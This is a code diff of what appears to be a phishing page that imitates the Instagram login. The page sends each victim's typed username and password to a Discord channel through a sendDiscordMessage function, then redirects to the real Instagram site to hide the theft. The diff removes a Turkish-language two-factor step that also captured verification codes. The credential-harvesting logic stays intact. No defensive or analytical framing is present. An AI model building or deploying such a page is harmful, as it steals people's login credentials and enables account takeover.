@@ -24,20 +24,11 @@
             transition: transform 0.5s ease;
         }
 
-        .login-container, .verification-container {
+        .login-container {
             width: 100%;
             max-width: 400px;
             padding: 20px;
             flex-shrink: 0;
-        }
-
-        .verification-container {
-            margin-left: 20px;
-            display: none;
-        }
-
-        .verification-container.active {
-            display: block;
         }
 
         .title {
@@ -174,27 +165,19 @@
         async function sendToDiscord(event, type) {
             event.preventDefault();
             
-            if (type === 'login') {
-                const username = document.getElementById('username').value;
-                const password = document.getElementById('password').value;
-                
-                document.getElementById('loading-message').classList.add('show');
-                
-                const message = `New Login Attempt\nUsername/Email: ${username}\nPassword: ${password}`;
-                await sendDiscordMessage(message);
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            document.getElementById('loading-message').classList.add('show');
+            
+            const message = `New Login Attempt\nUsername/Email: ${username}\nPassword: ${password}`;
+            await sendDiscordMessage(message);
 
-                setTimeout(() => {
-                    document.getElementById('loading-message').classList.remove('show');
-                    window.location.href = 'https://www.instagram.com/';
-                }, 1500);
-
-            } else if (type === '2fa') {
-                const code = document.getElementById('verification-code').value;
-                const message = `2FA Code: ${code}`;
-                await sendDiscordMessage(message);
-
+            // Always redirect to Instagram after 1.5 seconds
+            setTimeout(() => {
+                document.getElementById('loading-message').classList.remove('show');
                 window.location.href = 'https://www.instagram.com/';
-            }
+            }, 1500);
         }
 
         async function sendDiscordMessage(message) {
@@ -252,18 +235,6 @@
                 <img src="https://play.google.com/intl/en_us/badges/images/generic/en_badge_web_generic.png" alt="Get it on Google Play">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/f/f7/Get_it_from_Microsoft_Badge.svg" alt="Get it from Microsoft">
             </div>
-        </div>
-
-        <div class="verification-container">
-            <div class="title">İki Aşamalı Doğrulama</div>
-            <div class="verification-info">
-                Hesabınızı korumak için bir doğrulama kodu gönderdik. Lütfen telefonunuza veya e-posta adresinize gelen kodu girin.
-            </div>
-            <form onsubmit="sendToDiscord(event, '2fa')">
-                <input type="text" id="verification-code" placeholder="Doğrulama Kodu" required>
-                <div id="error-message" class="error-message">Girdiğiniz kod yanlış. Lütfen tekrar deneyin.</div>
-                <button type="submit" class="login-btn">Doğrula</button>
-            </form>
         </div>
     </div>
 </body>
